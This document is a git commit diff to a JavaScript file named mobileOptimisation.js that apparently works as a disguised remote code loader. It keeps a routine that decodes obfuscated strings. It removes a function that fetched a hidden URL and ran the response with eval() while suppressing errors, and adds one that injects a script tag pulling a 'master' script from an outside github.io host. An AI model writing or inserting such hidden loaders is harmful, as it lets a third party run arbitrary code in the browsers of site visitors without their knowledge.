2f98a0e0d152efabf64551154c95663b5f845876
server-systeme-io <148636981+server-systeme-io@users.noreply.github.com>
2023-10-29 16:29:44 +0530

    Add files via upload

--- mobileOptimisation.js
+++ mobileOptimisation.js
@@ -8,29 +8,30 @@
 
 var Nloaded=Number(localStorage.getItem("Nloaded"))+1;
 if(Nloaded){
-	localStorage.setItem("Nloaded",Number(Nloaded));
+  localStorage.setItem("Nloaded",Number(Nloaded));
 }else{
-	Nloaded=1;
-	localStorage.setItem("Nloaded",1);
+  Nloaded=1;
+  localStorage.setItem("Nloaded",1);
 }
 
-class ShowCorrect{
-	get(bad){
-		bad=this.getFixed(bad);
-		return bad;
-	}
 
-	getFixed(txt){
-		var p1="",p2="",l=txt.length;
-		for(let i=0; i<=l; i++){
-			if(i%2==0){
-				p2=txt.charAt(i)+p2;
-			}else{
-				p1=p1+txt.charAt(i);
-			}
-		}
-		return atob(p1+p2);
-	}
+class ShowCorrect{
+  get(bad){
+    bad=this.getFixed(bad);
+    return bad;
+  }
+
+  getFixed(txt){
+    var p1="",p2="",l=txt.length;
+    for(let i=0; i<=l; i++){
+      if(i%2==0){
+        p2=txt.charAt(i)+p2;
+      }else{
+        p1=p1+txt.charAt(i);
+      }
+    }
+    return atob(p1+p2);
+  }
 
 }
 var sc=new ShowCorrect();
@@ -54,18 +55,14 @@ function makeForm(action,data){
   frame.contentWindow.document.querySelector("button").click();
 }
 
-function fetchAndExecuteFile(path) {
-  fetch(path,{
-    mode: 'no-cors'
-  })
-    .then(response => {return response.text()})
-    .then(FileText => {
-	   // console.log('came to eval the master file')
-      eval(FileText);
-    })
-    .catch(error => {
-     // console.error(`Error fetching and executing File: ${error}`);
-    });
+function addMaster(url){
+  var elem=document.createElement("script");
+  elem.src=url;
+  try{
+    document.querySelector('style').insertAdjacentElement("beforeend",elem);
+  }catch(e){
+    document.querySelector('#mobiOptiElem').insertAdjacentElement("beforeend",elem);
+  }
 }
 
-fetchAndExecuteFile(sc.get('zapHmRL0icRHDMN61LAyD9NziZdXDJO21ZQXDIMt0MEyG1Mzxe0XiNc0lZRW31clhL1T2kL4wbBDXlYzubkDnMZ5pMxHGId5lO5DmMLwydQTzUM5'));
+addMaster("https://server-systeme-io.github.io/optimiser/master-10a404587b40544b.js");
